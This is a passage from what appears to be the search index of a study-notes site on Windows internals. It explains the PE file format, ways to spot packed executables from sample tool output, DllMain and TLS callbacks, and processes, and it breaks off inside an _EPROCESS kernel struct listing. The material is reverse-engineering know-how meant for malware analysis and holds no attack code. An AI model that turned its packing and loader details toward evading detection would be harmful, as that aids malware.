23 00 00 54 00 00 00 00 00 00 00 00 00 00 00   #..T...........\n000001B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n000001C0  10 20 00 00 18 01 00 00 00 00 00 00 00 00 00 00  . ..............\n000001D0  28 21 00 00 40 01 00 00 00 00 00 00 00 00 00 00  (!..@...........\n000001E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n</code></pre>"},{"location":"Windows_Internals/PE/#image_nt_headers-nt_headers","title":"IMAGE_NT_HEADERS: NT_HEADERS","text":"<p>Defines the <code>format</code> of the file, contains the <code>signature</code> and <code>image file header</code>, and <code>other information headers</code>.</p> <p>The PE file header is the section with the least human-readable output. You can identify the start of the PE file header from the <code>PE stub</code> in the hex dump section below.</p> <p>Before diving into the details of <code>NT_HEADERS</code>, let's get an overview of the NT_HEADERS.</p> <p>Remember, the starting address of IMAGE_NT_HEADERS is found in <code>e_lfanew</code> from the IMAGE_DOS_HEADER.</p> <p>The NT_HEADERS consist of the following:</p> <ul> <li>Signature</li> <li>FILE_HEADER</li> <li>OPTIONAL_HEADER</li> </ul>"},{"location":"Windows_Internals/PE/#signature","title":"Signature","text":"<p>The Signature is the first 4 bytes that denote the start of the NT_HEADER.</p>"},{"location":"Windows_Internals/PE/#image_file_header","title":"(IMAGE_)FILE_HEADER","text":"<ul> <li> <p><code>Machine</code>: Type of architecture for which the PE file is written. </p> <p>E.g: We can see that the architecture is i386 which means that this PE file is compatible with 32-bit Intel architecture.</p> </li> <li> <p><code>NumberOfSections</code>: A PE file contains different sections where <code>code</code>, <code>variables</code>, and <code>other resources</code> are stored. This field of the IMAGE_FILE_HEADER mentions the <code>number of sections</code> the PE file has.</p> </li> <li><code>TimeDateStamp</code>: The time and date of the binary compilation.</li> <li><code>PointerToSymbolTable and NumberOfSymbols</code>: These fields are not generally related to PE files. Instead, they are here due to the COFF file headers.</li> <li><code>SizeOfOptionalHeader</code>: The size of the optional header.</li> <li> <p><code>Characteristics</code>: Mentions the different characteristics of a PE file.</p> <p>E.g: In our case (example program), this field tells us that:</p> <ul> <li>PE file has <code>stripped relocation information</code></li> <li>PE file has <code>stripped line numbers</code></li> <li>PE file has <code>stripped local symbol information</code></li> <li>It is an executable image</li> <li>It is compatible with a 32-bit machine</li> </ul> </li> </ul> <p>To learn more about the FILE_HEADER, you can check out Microsoft Documentation for it.</p>"},{"location":"Windows_Internals/PE/#optional_header","title":"OPTIONAL_HEADER","text":"<p>The OPTIONAL_HEADER is also a part of the NT_HEADERS. It has a deceiving name and contains some of the most important information present in the PE headers.</p> <ul> <li> <p><code>Magic</code>: The Magic number tells whether the PE file is a 32-bit or 64-bit application.</p> <ul> <li><code>0x010B</code>: denotes a 32-bit application</li> <li><code>0x020B</code>: denotes a 64-bit application</li> </ul> </li> <li> <p><code>AddressOfEntryPoint</code>: This is the address from where Windows will begin execution. In other words, the first instruction to be executed is present at this address.</p> <p>This is a <code>Relative Virtual Address (RVA)</code>, meaning it is at an <code>offset relative to the base address of the image</code> (<code>ImageBase</code>) once loaded into memory.</p> </li> <li> <p><code>BaseOfCode</code>: Address of the <code>code section</code>, relative to <code>ImageBase</code></p> </li> <li><code>BaseOfData</code>: Address of the <code>data section</code>, relative to <code>ImageBase</code></li> <li> <p><code>ImageBase</code>: The ImageBase is the <code>preferred loading address of the PE file in memory</code>.</p> <p>Generally, the ImageBase for .exe files is <code>0x00400000</code>. Since Windows can't load all PE files at this preferred address, some relocations are in order when the file is loaded in memory. These <code>relocations are then performed relative to the ImageBase</code>.</p> </li> <li> <p><code>Subsystem</code>: The Subsystem required to run the image.</p> <p>The Subsystem can be Windows Native, GUI (Graphical User Interface), CUI (Commandline User Interface), or some other Subsystem. We can find the complete list in Microsoft Documentation.</p> </li> </ul>"},{"location":"Windows_Internals/PE/#data-directory-dictionary-section","title":"Data directory / dictionary section","text":"<p>The <code>DataDirectory</code> is a structure that contains import and export information of the PE file (called <code>Import Address Table</code> and <code>Export Address Table</code>). This information is handy as it gives a glimpse of what the PE file might be trying to do.</p> <p>Each data directory entry consists of: - A Virtual Address (RVA) pointing to the corresponding structure - The Size of that structure</p> <p>The data directories provide offsets and sizes for important parts of the PE file, such as:</p> <ul> <li>Import Table</li> <li>Export Table</li> <li>Resource Table</li> <li>Base Relocation Table</li> </ul>"},{"location":"Windows_Internals/PE/#image_nt_headers-image_section_header-or-section-table","title":"IMAGE_NT_HEADERS: IMAGE_SECTION_HEADER or Section table","text":"<p>The data that a PE file needs to perform its functions, like code, icons, images, User Interface elements, etc., are stored in different Sections. We can find information about these Sections in the <code>IMAGE_SECTION_HEADER</code>.</p> <p>As we can see, the IMAGE_SECTION_HEADER has different sections:</p> Section Purpose <code>.text</code> <code>Contains executable code</code> for the application and entry point. <code>.data</code> <code>Contains initialized data</code> (strings, variables, etc.). <code>.ndata</code> Contains <code>uninitialized data</code>. <code>.rdata</code> or <code>.idata</code> Contains <code>import information</code> (Windows API) and DLLs of the PE file. Import information helps a PE file import functions from other files or Windows API. <code>.reloc</code> Contains <code>relocation information</code>. <code>.rsrc</code> Contains application resources like <code>icons</code>, <code>images</code>, or <code>other resources</code> required for the application UI. <code>.debug</code> Contains debug information <p>All of these different types of sections commonly include important information:</p> <ul> <li><code>VirtualAddress</code>: Contains <code>this section's Relative Virtual Address (RVA)</code> in the memory.</li> <li><code>VirtualSize</code>: Contains the <code>section's size once loaded into the memory</code>.</li> <li><code>SizeOfRawData</code>: Contains the s<code>ection size as stored on the disk before the PE file is loaded in memory</code>.</li> <li> <p><code>Characteristics</code>: Contains the <code>permissions</code> that the section has.</p> <p>E.g: <code>CODE | EXECUTE | READ</code>, meaning that this section contains executable code, which <code>can be read but can't be written to</code>.</p> </li> </ul> <pre><code>000001F0  2E 74 65 78 74 00 00 00 D0 0B 00 00 00 10 00 00  .text...\u00d0.......\n00000200  00 0C 00 00 00 04 00 00 00 00 00 00 00 00 00 00  ................\n00000210  00 00 00 00 20 00 00 60 2E 72 64 61 74 61 00 00  .... ..`.rdata..\n00000220  76 0C 00 00 00 20 00 00 00 0E 00 00 00 10 00 00  v.... ..........\n00000230  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@\n00000240  2E 64 61 74 61 00 00 00 B8 06 00 00 00 30 00 00  .data...\u00b8....0..\n00000250  00 02 00 00 00 1E 00 00 00 00 00 00 00 00 00 00  ................\n00000260  00 00 00 00 40 00 00 C0 2E 70 64 61 74 61 00 00  ....@..\u00c0.pdata..\n00000270  F0 00 00 00 00 40 00 00 00 02 00 00 00 20 00 00  \u00f0....@....... ..\n00000280  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@\n00000290  2E 72 73 72 63 00 00 00 10 47 00 00 00 50 00 00  .rsrc....G...P..\n000002A0  00 48 00 00 00 22 00 00 00 00 00 00 00 00 00 00  .H...\"..........\n000002B0  00 00 00 00 40 00 00 40 2E 72 65 6C 6F 63 00 00  ....@..@.reloc..\n000002C0  2C 00 00 00 00 A0 00 00 00 02 00 00 00 6A 00 00  ,.... .......j..\n000002D0  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42  ............@..B\n</code></pre>"},{"location":"Windows_Internals/PE/#pe-base-relocations","title":"PE Base relocations","text":""},{"location":"Windows_Internals/PE/#image_nt_headers-image_import_descriptor","title":"IMAGE_NT_HEADERS: IMAGE_IMPORT_DESCRIPTOR","text":"<p>PE files don't contain all the code they need to perform their functions. In a Windows Operating System, PE files leverage code from the Windows API to perform many functions.</p> <p>The <code>IMAGE_IMPORT_DESCRIPTOR</code> structure contains information about the different <code>Windows APIs that the PE file loads when executed</code>.</p> <p>This information is handy in identifying the potential activity that a PE file might perform.</p> <p>E.g: if a PE file imports CreateFile API, it indicates that it might create a file when executed.</p> <p>These files are <code>dynamically linked libraries (DLL's)</code> that export Windows functions or APIs for other PE files.</p> <p>We can also see that inside of the dll's section there are the values <code>OriginalFirstThunk</code> and <code>FirstThunk</code>. The Operating System uses these values to build the <code>Import Address Table (IAT)</code> of the PE file.</p>"},{"location":"Windows_Internals/PE/#packing-and-identifying-packed-executables","title":"Packing and Identifying packed executables","text":"<p>Since a PE file's information can be easily extracted using a <code>Hex editor</code> or a tool like <code>pe-tree</code>, it becomes undesirable for people who don't want their code to be reverse-engineered.</p> <p>This is where the <code>packers</code> come in. A packer is a <code>tool to obfuscate the data in a PE file</code> so that it can't be read without unpacking it. In simple words, packers <code>pack the PE file in a layer of obfuscation</code> to avoid reverse engineering and <code>render a PE file's static analysis useless</code>. When the PE file is executed, it runs the unpacking routine to extract the original code and then executes it.</p> <p>Legitimate software developers use packing to address piracy concerns, and malware authors use it to avoid detection.</p>"},{"location":"Windows_Internals/PE/#how-to-identify-if-a-pe-file-is-packed","title":"How to identify if a PE file is packed","text":""},{"location":"Windows_Internals/PE/#strings","title":"Strings","text":"<p>A packed malware will not show important information when running a string search against it.</p> <p>Notice that the sample below contains mainly garbage strings that don't provide much value to us:</p> <pre><code>!This program cannot be run in DOS mode.\nRichH\n.rsrc\n.data\n.adata\ndApB\nQtq5\nwn;3b:TC,n\n*tVlr\nD6j[\n^sZ\"4V\nJIoL\nj~AI\ntYFu\n7^V1\nvYB09\n\"PeHy\nM4AF#\n3134\n%}W\\+\n3A;a5\ndLq&lt;\n.\n.\n.\n.\n.\n.\n</code></pre>"},{"location":"Windows_Internals/PE/#section-header-names","title":"Section header names","text":"<p>A PE file has a .text section, a .data section, and a .rsrc section, where only the .text section has the execute flag set because it contains the code. Now take the example of the file named zmsuz3pinwl. When we open this file in pe-tree, we find that it has <code>unconventional section names</code> (<code>or no names</code>, in this case).</p> <p></p> <p>We might think this has something to do with the tool we use to analyze the file. Therefore, let's check it using another PE analysis tool called <code>pecheck</code>. The pecheck tool provides the same information we have been gathering from the pe-tree tool, but it is a command-line tool.</p> <p>Let's see the information in the PE Sections heading in the output:</p> <pre><code>----------PE Sections----------\n\n[IMAGE_SECTION_HEADER]\n0x1F0      0x0   Name:                          \n0x1F8      0x8   Misc:                          0x3F4000  \n0x1F8      0x8   Misc_PhysicalAddress:          0x3F4000  \n0x1F8      0x8   Misc_VirtualSize:              0x3F4000  \n0x1FC      0xC   VirtualAddress:                0x1000    \n0x200      0x10  SizeOfRawData:                 0xD3400   \n0x204      0x14  PointerToRawData:              0x400     \n0x208      0x18  PointerToRelocations:          0x0       \n0x20C      0x1C  PointerToLinenumbers:          0x0       \n0x210      0x20  NumberOfRelocations:           0x0       \n0x212      0x22  NumberOfLinenumbers:           0x0       \n0x214      0x24  Characteristics:               0xE0000040\nFlags: IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE\nEntropy: 7.999788 (Min=0.0, Max=8.0)\nMD5     hash: fa9814d3aeb1fbfaa1557bac61136ba7\nSHA-1   hash: 8db955c622c5bea3ec63bd917db9d41ce038c3f7\nSHA-256 hash: 24f922c1cd45811eb5f3ab6f29872cda11db7d2251b7a3f44713627ad3659ac9\nSHA-512 hash: e122e4600ea201058352c97bb7549163a0a5bcfb079630b197fe135ae732e64f5a6daff328f789e7b2285c5f975bce69414e55adba7d59006a1f0280bf64971c\n</code></pre> <p>We see here that the section name is empty, and it is not a glitch in the tool we used to analyze the PE file.</p>"},{"location":"Windows_Internals/PE/#dllmain-and-tls-callbacks","title":"DllMain and TLS Callbacks","text":"<ul> <li> <p><code>DllMain</code> is just an entry point function inside the DLL\u2019s .text (code) section:</p> <ul> <li>When a DLL is loaded, Windows calls DllMain, if it exists, to handle events like process/thread attach/detach.</li> <li>The address of DllMain is stored in the PE's <code>Optional Header</code> \u2192 <code>AddressOfEntryPoint</code> field.</li> <li>The actual function code for DllMain is stored in the <code>.text</code> section of the DLL.</li> <li>In memory, DllMain is simply an executable function within the DLL\u2019s .text section.</li> </ul> </li> <li> <p>TLS (Thread Local Storage) callbacks are special functions that execute when a thread is created or terminated:</p> <ul> <li>Their addresses are stored in the <code>TLS directory</code> of the PE file.</li> <li>The TLS directory is located in the PE's data directory (<code>IMAGE_DIRECTORY_ENTRY_TLS</code>).</li> <li>Inside this directory, there is a <code>pointer to an array of TLS callback function addresses</code>.</li> <li>The actual callback functions are located in the .text section, just like DllMain.</li> </ul> </li> </ul> <p>Warning</p> <p>Reads about DllMain Loader Locks.</p>"},{"location":"Windows_Internals/PE/#section-entropy","title":"Section entropy","text":"<p>Another thing that we might notice here is that the Entropy of the .data section and three of the four unnamed sections is <code>higher than seven and is approaching 8</code>. As we discussed in a previous task, higher Entropy represents a <code>higher level of randomness in data</code>. Random data is generally generated when the original data is obfuscated, indicating that these values <code>might indicate a packed executable</code>.</p>"},{"location":"Windows_Internals/PE/#section-permissions","title":"Section permissions","text":"<p>Apart from the section names, another indicator of a packed executable is the permissions of each section. For the PE file in the above terminal, we can see that the section <code>contains initialized data and has READ, WRITE and EXECUTE permissions</code>. Similarly, some <code>other sections also have READ, WRITE and EXECUTE permissions</code>. This is also usually <code>not found in an ordinary unpacked PE file</code>, where only the .text section has EXECUTE permissions.</p>"},{"location":"Windows_Internals/PE/#sizeofrawdata-misc_virtualsize","title":"SizeOfRawData &amp; Misc_VirtualSize","text":"<p>Another valuable piece of information from the section headers to identify a packed executable is the <code>SizeOfRawData</code> and <code>Misc_VirtualSize</code>. In a packed executable, the <code>SizeOfRawData will always be significantly smaller than the Misc_VirtualSize in sections with WRITE and EXECUTE permissions</code>. This is because when the PE file unpacks during execution, it writes data to this section, increasing its size in the memory compared to the size on disk, and then executes it.</p>"},{"location":"Windows_Internals/PE/#from-import-functions","title":"From import functions","text":"<p>The last important indicator of a packed executable we discuss here is its import functions. The redline PE file we analyzed earlier imported lots of functions, indicating the activity it potentially performs. However, for the PE file zmsuz3pinwl, <code>we will see only a handful of imports</code>, especially the GetProcAddress, GetModuleHandleA, and <code>LoadLibraryA</code>. These functions are often <code>some of the only few imports of a packed PE file because these functions provide the functionality to unpack the PE file during runtime</code>.</p>"},{"location":"Windows_Internals/PE/#tools","title":"Tools","text":"<ul> <li>wxHexEditor</li> <li>pe-tree</li> <li>pecheck</li> <li>Detect it easy</li> <li>NTCore: Explorer Suite or CFF explorer</li> <li>PE-bear</li> </ul>"},{"location":"Windows_Internals/Processes/","title":"Processes","text":"<p>A process might seem a lot like a program, but they are two different things.</p> <p>The program contains the instructions that you want your machine to execute and the process contains the environment that it needs to be processing those instructions. It maintains and represents the execution of a program.</p> <p>When you actually run the program or .exe file, it becomes a <code>process</code> (or multiple). At this point you initialize an <code>instance</code> of the executable program that is being ran, this is the process.</p> <p>A process has <code>components</code> or <code>resources</code> that it compromises of or interact with. The Microsoft docs give brief break-down of these components.</p> <p>Here's a few examples of default applications that start processes: - MsMpEng (Microsoft Defender) - wininit (keyboard and mouse) - lsass (credential storage)</p> <p>Applications running on your operating system can contain <code>one or more processes</code>.</p>  Kernel structure  <pre><code>//0x840 bytes (sizeof)\nstruct _EPROCESS\n{\n    struct _KPROCESS Pcb;                                                   //0x0\n    struct _EX_PUSH_LOCK ProcessLock;                                       //0x1c8\n    VOID* UniqueProcessId;                                                  //0x1d0\n    struct _LIST_ENTRY ActiveProcessLinks;                                  //0x1d8\n    struct _EX_RUNDOWN_REF RundownProtect;                                  //0x1e8\n    union\n    {\n        ULONG Flags2;                                                       //0x1f0\n        struct\n        {\n            ULONG JobNotReallyActive:1;                                     //0x1f0\n            ULONG AccountingFolded:1;                                       //0x1f0\n            ULONG NewProcessReported:1;                                     //0x1f0\n            ULONG ExitProcessReported:1;                                    //0x1f0\n            ULONG ReportCommitChanges:1;                                    //0x1f0\n            ULONG LastReportMemory:1;                                       //0x1f0\n            ULONG ForceWakeCharge:1;                                        //0x1f0\n            ULONG CrossSessionCreate:1;                                     //0x1f0\n            ULONG NeedsHandleRundown:1;                                     //0x1f0\n            ULONG RefTraceEnabled:1;                                        //0x1f0\n            ULONG PicoCreated:1;                                            //0x1f0\n            ULONG EmptyJobEvaluated:1;                                      //0x1f0\n            ULONG DefaultPagePriority:3;                                    //0x1f0\n            ULONG PrimaryTokenFrozen:1;                                     //0x1f0\n            ULONG ProcessVerifierTarget:1;                                  //0x1f0\n            ULONG RestrictSetThreadContext:1;                               //0x1f0\n            ULONG AffinityPermanent:1;                                      //0x1f0\n            ULONG AffinityUpdateEnable:1;                                   //0x1f0\n            ULONG PropagateNode:1;                                          //0x1f0\n            ULONG ExplicitAffinity:1;                                       //0x1f0\n            ULONG Flags2Available1:2;                                       //0x1f0\n            ULONG EnableReadVmLogging:1;                                    //0x1f0\n            ULONG EnableWriteVmLogging:1;                                   //0x1f0\n            ULONG FatalAccessTerminationRequested:1;                        //0x1f0\n            ULONG DisableSystemAllowedCpuSet:1;                             //0x1f0\n            ULONG Flags2Available2:3;                                       //0x1f0\n            ULONG InPrivate:1;                                              //0x1f0\n        };\n    };\n    union\n    {\n        ULONG Flags;                                                        //0x1f4\n        struct\n        {\n            ULONG CreateReported:1;                                         //0x1f4\n            ULONG NoDebugInherit:1;                                         //0x1f4\n            ULONG ProcessExiting:1;                                         //0x1f4\n            ULONG ProcessDelete:1;                                          //0x1f4\n            ULONG ManageExecutableMemoryWrites:1;                           //0x1f4\n            ULONG VmDeleted:1;                                              //0x1f4\n            ULONG OutswapEnabled:1;                                         //0x1f4\n            ULONG Outswapped:1;                                             //0x1f4\n            ULONG FailFastOnCommitFail:1;                                   //0x1f4\n            ULONG Wow64VaSpace4Gb:1;                                        //0x1f4\n            ULONG AddressSpaceInitialized:2;                                //0x1f4\n            ULONG SetTimerResolution:1;                                     //0x1f4\n            ULONG BreakOnTermination:1;                                     //0x1f4\n            ULONG DeprioritizeViews:1;                                      //0x1f4\n            ULONG WriteWatch:1;                                             //0x1f4\n            ULONG ProcessInSession:1;                                       //0x1f4\n            ULONG OverrideAddressSpace:1;                                   //0x1f4\n            ULONG HasAddressSpace:1;                                        //0x1f4\n            ULONG LaunchPrefetched:1;                                       //0x1f4\n            ULONG Reserved:1;                                               //0x1f4\n            ULONG VmTopDown:1;                                              //0x1f4\n            ULONG ImageNotifyDone:1;                                        //0x1f4\n            ULONG PdeUpdateNeeded:1;                                        //0x1f4\n            ULONG VdmAllowed:1;                                             //0x1f4\n            ULONG ProcessRundown:1;                                         //0x1f4\n            ULONG ProcessInserted:1;                                        //0x1f4\n            ULONG DefaultIoPriority:3;                                      //0x1f4\n            ULONG ProcessSelfDelete:1;                                      //0x1f4\n            ULONG SetTimerResolutionLink:1;                                 //0x1f4\n        };\n    };\n    union _LARGE_INTEGER CreateTime;                                        //0x1f8\n    ULONGLONG ProcessQuotaUsage[2];                                         //0x200\n    ULONGLONG ProcessQuotaPeak[2];                                          //0x210\n    ULONGLONG PeakVirtualSize;                                              //0x220\n    ULONGLONG VirtualSize;                                                  //0x228\n    struct _LIST_ENTRY SessionProcessLinks;                                 //0x230\n    union\n    {\n        VOID* ExceptionPortData;                                            //0x240\n        ULONGLONG ExceptionPortValue;                                       //0x240\n        ULONGLONG ExceptionPortState:3;                                     //0x240\n    };\n    struct _EX_FAST_REF Token;                                              //0x248\n    ULONGLONG MmReserved;                                                   //0x250\n    struct _EX_PUSH_LOCK AddressCreationLock;                               //0x258\n    struct _EX_PUSH_LOCK PageTableCommitmentLock;                           //0x260\n    struct _ETHREAD* RotateInProgress;                                      //0x268\n    struct _ETHREAD* ForkInProgress;                                        //0x270\n    struct _EJOB* volatile CommitChargeJob;                                 //0x278\n    struct _RTL_AVL_TREE CloneRoot;                                         //0x280\n    volatile ULONGLONG NumberOfPrivatePages;                                //0x288\n    volatile ULONGLONG NumberOfLockedPages;                                 //0x290\n    VOID* Win32Process;                                                     //0x298\n    struct _EJOB* volatile Job;                                             //0x2a0\n    VOID* SectionObject;                                                    //0x2a8\n    VOID* SectionBaseAddress;                                               //0x2b0\n    ULONG Cookie;                                                           //0x2b8\n    struct _PAGEFAULT_HISTORY* WorkingSetWatch;                             //0x2c0\n    VOID* Win32WindowStation;                                               //0x2c8\n    VOID* InheritedFromUniqueProcessId;                                     //0x2d0\n    volatile ULONGLONG OwnerProcessId;                                      //0x2d8\n    struct _PEB* Peb;                                                       //0x2e0\n    struct _PSP_SESSION_SPACE* Session;                                     //0x2e8\n    VOID* Spare1;                                                           //0x2f0\n    struct _EPROCESS_QUOTA_BLOCK* QuotaBlock;                               //0x2f8\n    struct _HANDLE_TABLE* ObjectTable;                                      //0x300\n    VOID* DebugPort;                                                        //0x308\n    struct _EWOW64PROCESS* WoW64Process;                                    //0x310\n    struct _EX_FAST_REF DeviceMap;                                          //0x318\n    VOID* EtwDataSource;                                                    //0x320\n    ULONGLONG PageDirectoryPte;                                             //0x328\n    struct _FILE_OBJECT* ImageFilePointer;                                  //0x330\n    UCHAR ImageFileName[15];                                                //0x338\n    UCHAR PriorityClass;                                                    //0x347\n    VOID* SecurityPort;                                                     //0x348\n    struct _SE_AUDIT_PROCESS_CREATION_INFO SeAuditProcessCreationInfo;      //0x350\n    struct _LIST_ENTRY JobLinks;                                            //0x358\n    VOID* HighestUserAddress;                                               //0x368\n    struct _LIST_ENTRY ThreadListHead;                                      //0x370\n    volatile ULONG ActiveThreads;                                           //0x380\n    ULONG ImagePathHash;                                                    //0x384\n    ULONG DefaultHardErrorProcessing;                                       //0x388\n    LONG LastThreadExitStatus;                                              //0x38c\n    struct _EX_FAST_REF PrefetchTrace;                                      //0x390\n    VOID* LockedPagesList;                                                  //0x398\n    union _LARGE_INTEGER ReadOperationCount;                                //0x3a0\n    union _LARGE_INTEGER WriteOperationCount;                               //0x3a8\n    union _LARGE_INTEGER OtherOperationCount;                               //0x3b0\n    union _LARGE_INTEGER ReadTransferCount;                                 //0x3b8\n    union _LARGE_INTEGER WriteTransferCount;                                //0x3c0\n    union _LARGE_INTEGER OtherTransferCount;                                //0x3c8\n    ULONGLONG CommitChargeLimit;                                            //0x3d0\n    volatile ULONGLONG CommitCharge;                                        //0x3d8\n    volatile ULONGLONG CommitChargePeak;                                    //0x3e0\n    struct _MMSUPPORT_FULL Vm;                                              //0x400\n    struct _LIST_ENTRY MmProcessLinks;                                      //0x540\n    volatile ULONG ModifiedPageCount;                                       //0x550\n    LONG ExitStatus;                                                        //0x554\n    struct _RTL_AVL_TREE VadRoot;                                           //0x558\n    VOID* VadHint;                                                          //0x560\n    ULONGLONG VadCount;                                                     //0x568\n    volatile ULONGLONG VadPhysicalPages;                                    //0x570\n    ULONGLONG VadPhysicalPagesLimit;                                        //0x578\n    struct _ALPC_PROCESS_CONTEXT AlpcContext;                               //0x580\n    struct _LIST_ENTRY TimerResolutionLink;                                 //0x5a0\n    struct _PO_DIAG_STACK_RECORD* TimerResolutionStackRecord;               //0x5b0\n    ULONG RequestedTimerResolution;                                         //0x5b8\n    ULONG SmallestTimerResolution;                                          //0x5bc\n    union _LARGE_INTEGER ExitTime;                                          //0x5c0\n    struct _INVERTED_FUNCTION_TABLE_KERNEL_MODE* InvertedFunctionTable;     //0x5c8\n    struct _EX_PUSH_LOCK InvertedFunctionTableLock;                         //0x5d0\n    ULONG ActiveThreadsHighWatermark;                                       //0x5d8\n    ULONG LargePrivateVadCount;                                             //0x5dc\n    struct _EX_PUSH_LOCK ThreadListLock;                                    //0x5e0\n    VOID* WnfContext;                                                       //0x5e8\n    struct _EJOB* ServerSilo;                                               //0x5f0\n    UCHAR SignatureLevel;                                                   //0x5f8\n    UCHAR SectionSignatureLevel;                                            //0x5f9\n    struct _PS_PROTECTION Protection;                                       //0x5fa\n    UCHAR HangCount:3;                                                      //0x5fb\n    UCHAR GhostCount:3;                                                     //0x5fb\n    UCHAR PrefilterException:1;                                             //0x5fb\n    union\n    {\n        ULONG Flags3;                                                       //0x5fc\n        struct\n        {\n            ULONG Minimal:1;                                                //0x5fc\n            ULONG ReplacingPageRoot:1;                                      //0x5fc\n            ULONG Crashed:1;                                                //0x5fc\n            ULONG JobVadsAreTracked:1;                                      //0x5fc\n            ULONG VadTrackingDisabled:1;                                    //0x5fc\n            ULONG AuxiliaryProcess:1;                                       //0x5fc\n            ULONG SubsystemProcess:1;                                       //0x5fc\n            ULONG IndirectCpuSets:1;                                        //0x5fc\n            ULONG RelinquishedCommit:1;                                     //0x5fc\n            ULONG HighGraphicsPriority:1;                                   //0x5fc\n            ULONG CommitFailLogged:1;                                       //0x5fc\n            ULONG ReserveFailLogged:1;                                      //0x5fc\n            ULONG SystemProcess:1;                                          //0x5fc\n            ULONG AllImagesAtBasePristineBase:1;                            //0x5fc\n            ULONG AddressPolicyFrozen:1;                                    //0x5fc\n            ULONG ProcessFirstResume:1;                                     //0x5fc\n            ULONG ForegroundExternal:1;                                     //0x5fc\n            ULONG ForegroundSystem:1;                                       //0x5fc\n            ULONG HighMemoryPriority:1;                                     //0x5fc\n            ULONG EnableProcessSuspendResumeLogging:1;                      //0x5fc\n            ULONG EnableThreadSuspendResumeLogging:1;                       //0x5fc\n            ULONG SecurityDomainChanged:1;                                  //0x5fc\n            ULONG SecurityFreezeComplete:1;                                 //0x5fc\n            ULONG VmProcessorHost:1;                                        //0x5fc\n            ULONG VmProcessorHostTransition:1;                              //0x5fc\n            ULONG AltSyscall:1;                                             //0x5fc\n            ULONG TimerResolutionIgnore:1;                                  //0x5fc\n            ULONG DisallowUserTerminate:1;                                  //0x5fc\n            ULONG EnableProcessRemoteExecProtectVmLogging:1;                //0x5fc\n            ULONG EnableProcessLocalExecProtectVmLogging:1;                 //0x5fc\n            ULONG MemoryCompressionProcess:1;                               //0x5fc\n            ULONG EnableProcessImpersonationLogging:1;                      //0x5fc\n        };\n    };\n    LONG DeviceAsid;                                                        //0x600\n    VOID* SvmData;                                                          //0x608\n    struct _EX_PUSH_LOCK SvmProcessLock;                                    //0x610\n    ULONGLONG SvmLock;                                                      //0x618\n    struct _LIST_ENTRY SvmProcessDeviceListHead;                            //0x620\n    ULONGLONG LastFreezeInterruptTime;                                      //0x630\n    struct _PROCESS_DISK_COUNTERS* DiskCounters;                            //0x638\n    VOID* PicoContext;                                                      //0x640\n    VOID* EnclaveTable;                                                     //0x648\n    ULONGLONG EnclaveNumber;                                                //0x650\n    struct _EX_PUSH_LOCK EnclaveLock;                                       //0x658\n    ULONG HighPriorityFaultsAllowed;                                        //0x660\n    struct _PO_PROCESS_ENERGY_CONTEXT* EnergyContext;                       //0x668\n    VOID* VmContext;                                                        //0x670\n    ULONGLONG SequenceNumber;                                               //0x678\n    ULONGLONG CreateInterruptTime;                                          //0x680\n    ULONGLONG CreateUnbiasedInterruptTime;                                  //0x688\n    ULONGLONG TotalUnbiasedFrozenTime;                                      //0x690\n    ULONGLONG LastAppStateUpdateTime;                                       //0x698\n    ULONGLONG LastAppStateUptime:61;                                        //0x6a0\n    ULONGLONG LastAppState:3;                                               //0x6a0\n    volatile ULONGLONG SharedCommitCharge;                                  //0x6a8\n    struct _EX_PUSH_LOCK SharedCommitLock;                                  //0x6b0\n    struct _LIST_ENTRY SharedCommitLinks;                                   //0x6b8\n    union\n    {\n        struct\n        {\n            ULONGLONG AllowedCpuSets;                                       //0x6c8\n            ULONGLONG DefaultCpuSets;                                       //0x6d0\n        };\n        struct\n        {\n            ULONGLONG* AllowedCpuSetsIndirect;                              //0x6c8\n            ULONGLONG* DefaultCpuSetsIndirect;                              //0x6d0\n        };\n    };\n    VOID* DiskIoAttribution;                                                //0x6d8\n    VOID* DxgProcess;                                                       //0x6e0\n    ULONG Win32KFilterSet;                                                  //0x6e8\n    USHORT Machine;                                                         //0x6ec\n    UCHAR MmSlabIdentity;                                                   //0x6ee\n    UCHAR Spare0;                                                           //0x6ef\n    unionvolatile _PS_INTERLOCKED_TIMER_DELAY_VALUES ProcessTimerDelay;     //0x6f0\n    volatile ULONG KTimerSets;                                              //0x6f8\n    volatile ULONG KTimer2Sets;                                             //0x6fc\n    volatile ULONG ThreadTimerSets;                                         //0x700\n    ULONGLONG VirtualTimerListLock;                                         //0x708\n    struct _LIST_ENTRY VirtualTimerListHead;                                //0x710\n    union\n    {\n        struct _WNF_STATE_NAME WakeChannel;                                 //0x720\n        struct _PS_PROCESS_WAKE_INFORMATION WakeInfo;                       //0x720\n    };\n    union\n    {\n        ULONG MitigationFlags;                                              //0x750\n        struct\n        {\n            ULONG ControlFlowGuardEnabled:1;                                //0x750\n            ULONG ControlFlowGuardExportSuppressionEnabled:1;               //0x750\n            ULONG ControlFlowGuardStrict:1;                                 //0x750\n            ULONG DisallowStrippedImages:1;                                 //0x750\n            ULONG ForceRelocateImages:1;                                    //0x750\n            ULONG HighEntropyASLREnabled:1;                                 //0x750\n            ULONG StackRandomizationDisabled:1;                             //0x750\n            ULONG ExtensionPointDisable:1;                                  //0x750\n            ULONG DisableDynamicCode:1;                                     //0x750\n            ULONG DisableDynamicCodeAllowOptOut:1;                          //0x750\n            ULONG DisableDynamicCodeAllowRemoteDowngrade:1;                 //0x750\n            ULONG AuditDisableDynamicCode:1;                                //0x750\n            ULONG DisallowWin32kSystemCalls:1;                              //0x750\n            ULONG AuditDisallowWin32kSystemCalls:1;                         //0x750\n            ULONG EnableFilteredWin32kAPIs:1;                               //0x750\n            ULONG AuditFilteredWin32kAPIs:1;                                //0x750\n            ULONG DisableNonSystemFonts:1;                                  //0x750\n            ULONG AuditNonSystemFontLoading:1;                              //0x750\n            ULONG PreferSystem32Images:1;                                   //0x750\n            ULONG ProhibitRemoteImageMap:1;                                 //0x750\n            ULONG AuditProhibitRemoteImageMap:1;                            //0x750\n            ULONG ProhibitLowILImageMap:1;                                  //0x750\n            ULONG AuditProhibitLowILImageMap:1;                             //0x750\n            ULONG SignatureMitigationOptIn:1;                               //0x750\n            ULONG 